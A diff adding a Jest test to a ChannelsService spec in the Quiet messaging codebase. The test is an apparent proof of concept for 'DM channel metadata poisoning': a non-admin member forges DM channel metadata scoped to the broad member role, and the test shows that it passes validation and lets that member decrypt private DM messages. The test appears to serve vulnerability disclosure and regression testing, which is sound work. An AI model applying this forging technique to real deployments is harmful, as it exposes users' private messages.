@@ -2,8 +2,10 @@ import { jest } from '@jest/globals'
 
 import { Test, TestingModule } from '@nestjs/testing'
 import { getBaseTypesFactory } from '@quiet/state-manager'
+import { generateDmChannelId } from '@quiet/common'
 import {
   ChannelMessage,
+  ChannelType,
   Community,
   DeleteChannelResponse,
   FileMetadata,
@@ -14,6 +16,7 @@ import {
 
 import path from 'path'
 import { type PeerId } from '@libp2p/interface'
+import { type LogEntry } from '@orbitdb/core'
 import waitForExpect from 'wait-for-expect'
 import { TestModule } from '../../common/test.module'
 import { createArbitraryFile, libp2pInstanceParams } from '../../common/utils'
@@ -33,6 +36,11 @@ import { createLogger } from '../../common/logger'
 import { ChannelsService } from './channels.service'
 import { SigChainService } from '../../auth/sigchain.service'
 import { CID } from 'multiformats/cid'
+import { SigChain } from '../../auth/sigchain'
+import { RoleName } from '../../auth/services/roles/roles'
+import { EncryptedAndSignedPayload, EncryptionScopeType } from '../../auth/services/crypto/types'
+import { InviteService } from '../../auth/services/invites/invite.service'
+import { UserService } from '../../auth/services/members/user.service'
 
 const logger = createLogger('channelsService:test')
 
@@ -106,6 +114,37 @@ describe('ChannelsService', () => {
       userId: aliceUserId,
     })
   })
+
+  const createNonAdminMemberChain = (username: string): SigChain => {
+    const adminChain = sigChainService.getActiveChain()
+    const invite = adminChain.invites.createUserInvite()
+    const salt = `${username}-poc-lockbox-salt`
+
+    adminChain.lockbox.createInviteLockboxes(invite.seed, salt, RoleName.MEMBER)
+
+    const invitedChain = SigChain.createFromInvite(username, invite.seed)
+    adminChain.invites.admitMemberFromInvite(
+      InviteService.generateProof(invite.seed),
+      invitedChain.user.userName,
+      invitedChain.user.userId,
+      UserService.redactUser(invitedChain.user).keys
+    )
+
+    const joinedChain = SigChain.joinForTesting(
+      {
+        user: invitedChain.user,
+        device: invitedChain.device,
+      },
+      adminChain.save(),
+      adminChain.team!.teamKeyring()
+    )
+    joinedChain.roles.addSelf(RoleName.MEMBER, invite.seed, salt)
+
+    expect(joinedChain.roles.amIAdmin()).toBe(false)
+    expect(joinedChain.roles.amIMemberOfRole(RoleName.MEMBER)).toBe(true)
+
+    return joinedChain
+  }
 
   afterEach(async () => {
     await storageService.stop()
@@ -302,6 +341,86 @@ describe('ChannelsService', () => {
           signature: expect.any(String),
         }),
       })
+    })
+  })
+
+  describe('DM channel metadata poisoning PoC', () => {
+    it('accepts member-signed DM metadata with broad member role and encrypts later DM messages to that role', async () => {
+      const bobChain = createNonAdminMemberChain('bob')
+      const malloryChain = createNonAdminMemberChain('mallory')
+      const activeChain = sigChainService.getActiveChain()
+      const dmMemberIds = [aliceUserId, bobChain.user.userId]
+      const legitimateDmRoleName = activeChain.dms.createWithMembers(dmMemberIds)
+      const dmChannelId = generateDmChannelId(dmMemberIds)
+
+      expect(activeChain.roles.memberHasRole(malloryChain.user.userId, legitimateDmRoleName)).toBe(false)
+      expect(activeChain.roles.memberHasRole(malloryChain.user.userId, RoleName.MEMBER)).toBe(true)
+
+      const forgedDmChannel: PublicChannel = {
+        id: dmChannelId,
+        name: 'alice, bob',
+        description: 'forged DM metadata',
+        owner: malloryChain.user.userId,
+        timestamp: Date.now(),
+        public: false,
+        roleName: RoleName.MEMBER,
+        type: ChannelType.DM,
+        memberIds: dmMemberIds,
+        teamId: activeChain.team!.id,
+      }
+      const forgedEntry = malloryChain.crypto.encryptAndSign(forgedDmChannel, {
+        type: EncryptionScopeType.ROLE,
+        name: RoleName.MEMBER,
+      })
+
+      await expect(
+        channelsService.validateEntry({
+          hash: 'poc-forged-dm-metadata',
+          payload: {
+            op: 'PUT',
+            key: forgedDmChannel.id,
+            value: forgedEntry,
+          },
+        } as unknown as LogEntry<EncryptedAndSignedPayload>)
+      ).resolves.toBe(true)
+
+      const storedChannel = channelsService.decryptChannelEntry(forgedEntry)
+      expect(storedChannel).toEqual(forgedDmChannel)
+
+      const poisonedStore = await channelsService.createChannel(storedChannel)
+
+      const dmMessage = await factory.build<ChannelMessage>('ChannelMessage', {
+        channelId: forgedDmChannel.id,
+        userId: aliceUserId,
+        message: 'secret message intended for the DM',
+      })
+
+      await expect(poisonedStore.sendMessage(dmMessage)).resolves.toBe(true)
+
+      const encryptedMessages = await poisonedStore.getEncryptedEntries([dmMessage.id])
+      expect(encryptedMessages).toHaveLength(1)
+      expect(encryptedMessages[0].contents.scope).toEqual({
+        generation: 0,
+        type: EncryptionScopeType.ROLE,
+        name: RoleName.MEMBER,
+      })
+      expect(encryptedMessages[0].contents.scope.name).not.toBe(legitimateDmRoleName)
+
+      const decryptedByMallory = malloryChain.crypto.decryptAndVerify<{
+        id: string
+        userId: string
+        channelId: string
+        message: string
+      }>(encryptedMessages[0].contents, encryptedMessages[0].encSignature)
+      expect(decryptedByMallory.isValid).toBe(true)
+      expect(decryptedByMallory.contents).toEqual(
+        expect.objectContaining({
+          id: dmMessage.id,
+          userId: aliceUserId,
+          channelId: forgedDmChannel.id,
+          message: dmMessage.message,
+        })
+      )
     })
   })
 
